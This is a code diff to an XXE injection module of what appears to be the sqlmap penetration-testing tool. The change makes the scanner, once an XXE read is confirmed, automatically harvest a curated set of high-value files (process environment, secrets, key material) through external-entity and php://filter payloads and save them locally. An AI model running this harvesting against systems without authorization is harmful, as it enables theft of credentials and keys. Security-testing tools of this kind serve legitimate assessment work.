@@ -26,6 +26,7 @@ from lib.core.enums import HTTPMETHOD
 from lib.core.settings import ASTERISK_MARKER
 from lib.core.settings import XXE_BLACKHOLE_HOST
 from lib.core.settings import XXE_ERROR_SIGNATURES
+from lib.core.settings import XXE_FILE_HARVEST
 from lib.core.settings import XXE_HARDENED_REGEX
 from lib.core.settings import XXE_IMPACT_FILES
 from lib.core.settings import OOB_POLL_ATTEMPTS
@@ -229,21 +230,50 @@ def _echoed(page):
 def _report(title, payload):
     if conf.beep:
         beep()
-    place = "%s XML body" % (conf.method or HTTPMETHOD.POST)
-    conf.dumper.singleString("---\nParameter: %s\n    Type: XXE injection\n    Title: %s\n    Payload: %s\n---" % (place, title, payload))
+    place = conf.method or HTTPMETHOD.POST
+    conf.dumper.singleString("---\nParameter: XML body (%s)\n    Type: XXE injection\n    Title: %s\n    Payload: %s\n---" % (place, title, payload))
+
+
+def _saveFileRead(remoteFile, content):
+    """Save an XXE-read file to the output directory (parity with '--file-read') and
+    return its local path, or None if it could not be written."""
+    try:
+        return dataToOutFile(remoteFile, getBytes(content))
+    except Exception as ex:
+        logger.debug("could not save XXE-read file to disk: %s" % getUnicode(ex))
+        return None
 
 
 def _dumpFileRead(remoteFile, content):
-    """Save an XXE-read file to the output directory (parity with '--file-read') and
-    list it; fall back to a console dump if the file cannot be written."""
-    try:
-        localPath = dataToOutFile(remoteFile, getBytes(content))
-        if localPath:
-            conf.dumper.rFile([localPath])
-            return
-    except Exception as ex:
-        logger.debug("could not save XXE-read file to disk: %s" % getUnicode(ex))
-    conf.dumper.singleString("XXE file read ('%s'):\n%s" % (remoteFile, content))
+    """Save a single XXE-read file and list it; fall back to a console dump if the
+    file cannot be written."""
+    localPath = _saveFileRead(remoteFile, content)
+    if localPath:
+        conf.dumper.rFile([localPath])
+    else:
+        conf.dumper.singleString("XXE file read ('%s'):\n%s" % (remoteFile, content))
+
+
+def _harvestFiles(xml, rootName):
+    """Proactive, best-effort file harvest run once an in-band XXE read primitive is
+    confirmed: pull a curated set of high-value fixed-path files (host identity,
+    process env/secrets, key material) the way the other non-SQL engines auto-dump
+    their reachable data. Returns a list of (path, content, payload) for every file
+    that read back non-empty; unreadable/absent files are silently skipped. Content is
+    de-duplicated so a parser that resolves every missing path to the same stub cannot
+    masquerade as many distinct reads."""
+
+    harvested = []
+    seen = set()
+    for path in XXE_FILE_HARVEST:
+        content, payload = _tryInbandFileRead(xml, rootName, path)
+        if content and content.strip():
+            key = content.strip()
+            if key in seen:
+                continue
+            seen.add(key)
+            harvested.append((path, content, payload))
+    return harvested
 
 
 def _tryInternal(xml, rootName, baseline):
@@ -280,7 +310,7 @@ def _tryInbandFileRead(xml, rootName, fileName):
     entity between two random markers so the exact file content can be sliced out
     of the response regardless of surrounding template. Raw file:// works for text
     files; php://filter base64 (PHP) carries files with XML-special bytes. Returns
-    the file content or None."""
+    (content, payload) or (None, None)."""
 
     from lib.core.convert import decodeBase64
 
@@ -303,13 +333,13 @@ def _tryInbandFileRead(xml, rootName, fileName):
             except Exception:
                 continue
         if data and data.strip():
-            return data
-    return None
+            return data, payload
+    return None, None
 
 
 def _tryExternalFile(xml, rootName, baseline):
     """Impact demonstration once XXE is live: read a benign host-identity file via
-    an external general entity. Returns (systemId, snippet) on a confirmed read."""
+    an external general entity. Returns (systemId, payload) on a confirmed read."""
 
     for systemId, pattern in XXE_IMPACT_FILES:
         ent = randomStr(length=8, lowercase=True)
@@ -317,7 +347,7 @@ def _tryExternalFile(xml, rootName, baseline):
         payload = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent)
         snippet = _confirmRead(_send(payload), pattern, baseline)
         if snippet:
-            return systemId, snippet
+            return systemId, payload
     return None, None
 
 
@@ -639,8 +669,9 @@ def xxeScan():
     _OOB_CONSENT = None
 
     debugMsg = "'--xxe' is self-contained: it detects XML External Entity injection "
-    debugMsg += "in the request body and demonstrates file-read impact. SQL enumeration "
-    debugMsg += "switches (--banner, --dbs, --tables, --dump) are ignored"
+    debugMsg += "in the request body and, once confirmed, automatically harvests high-value "
+    debugMsg += "host files (or reads '--file-read' when given). SQL enumeration switches "
+    debugMsg += "(--banner, --dbs, --tables, --dump) are ignored"
     logger.debug(debugMsg)
 
     xml = _cleanBody()
@@ -661,31 +692,59 @@ def xxeScan():
 
     # T2: in-band reflected DTD/internal-entity expansion. This proves the parser
     # processes entities but is NOT yet file-read impact, so it deliberately does NOT
-    # set `found` - the in-band read (or, if that fails, the error/XInclude tiers) still
-    # run to try to upgrade a mere "expansion confirmed" into actual file-read impact.
+    # set `found` on its own - we first try to UPGRADE it to real file-read impact and
+    # then emit a SINGLE report block with the strongest confirmed vector and its real
+    # payload (one report per finding, as with the other non-SQL engines). The internal
+    # expansion is only reported on its own when no external-entity read is reachable.
     payload, page = _tryInternal(xml, rootName, baseline)
     if payload:
         expansionSeen = True
         logger.info("the XML body processes DTD/internal entities (in-band reflection confirmed)")
-        _report("In-band DTD/internal entity expansion", payload)
 
         if conf.get("fileRead"):
-            content = _tryInbandFileRead(xml, rootName, conf.fileRead)
+            content, readPayload = _tryInbandFileRead(xml, rootName, conf.fileRead)
             if content:
                 found = True
                 logger.info("in-band XXE file-read impact confirmed for '%s'" % conf.fileRead)
-                _report("In-band file read ('%s')" % conf.fileRead, "<in-band reflected read of '%s'>" % conf.fileRead)
+                _report("In-band file read ('%s')" % conf.fileRead, readPayload)
                 _dumpFileRead(conf.fileRead, content)
         else:
-            # benign, in-band impact demonstration (data stays in the response, no third party)
-            systemId, snippet = _tryExternalFile(xml, rootName, baseline)
-            if not systemId:
-                snippet = _tryPhpFilter(xml, rootName, baseline)
-                systemId = "php://filter" if snippet else None
-            if systemId:
+            # No targeted '--file-read': proactively harvest a curated set of high-value
+            # files (data stays in the response, no third party) - the XXE analogue of
+            # the automatic dumping the other non-SQL engines do once confirmed.
+            harvested = _harvestFiles(xml, rootName)
+            if harvested:
                 found = True
-                logger.info("in-band XXE file-read impact confirmed (external entity, e.g. '%s')" % systemId)
-                _report("In-band file-read impact (external entity '%s')" % systemId, "<external-entity read of a benign file for impact>")
+                firstPath, _, firstPayload = harvested[0]
+                logger.info("in-band XXE file-read impact confirmed; harvested %d high-value file(s)" % len(harvested))
+                _report("In-band file read (auto-harvest, e.g. '%s')" % firstPath, firstPayload)
+                saved = []
+                for path, content, _ in harvested:
+                    logger.info("read remote file '%s' (%d bytes)" % (path, len(content)))
+                    localPath = _saveFileRead(path, content)
+                    if localPath:
+                        saved.append(localPath)
+                    else:
+                        conf.dumper.singleString("XXE file read ('%s'):\n%s" % (path, content))
+                if saved:
+                    conf.dumper.rFile(saved)
+            else:
+                # Harvest read nothing (content relocated in the response, or only benign
+                # host-identity is exposed): fall back to the pattern-based impact proof
+                # so file-read impact is still confirmed.
+                systemId, readPayload = _tryExternalFile(xml, rootName, baseline)
+                if not systemId:
+                    readPayload = _tryPhpFilter(xml, rootName, baseline)
+                    systemId = "php://filter" if readPayload else None
+                if systemId:
+                    found = True
+                    logger.info("in-band XXE file-read impact confirmed (external entity, e.g. '%s')" % systemId)
+                    _report("In-band file-read impact (external entity '%s')" % systemId, readPayload)
+
+        if not found:
+            # external entities are disabled (only internal expansion is reachable):
+            # report that weaker-but-real finding with its actual payload
+            _report("In-band DTD/internal entity expansion", payload)
 
     # T3: error-based (works where entities are not reflected but errors leak). A
     # redundant detection channel once in-band reflection was already seen, so it is
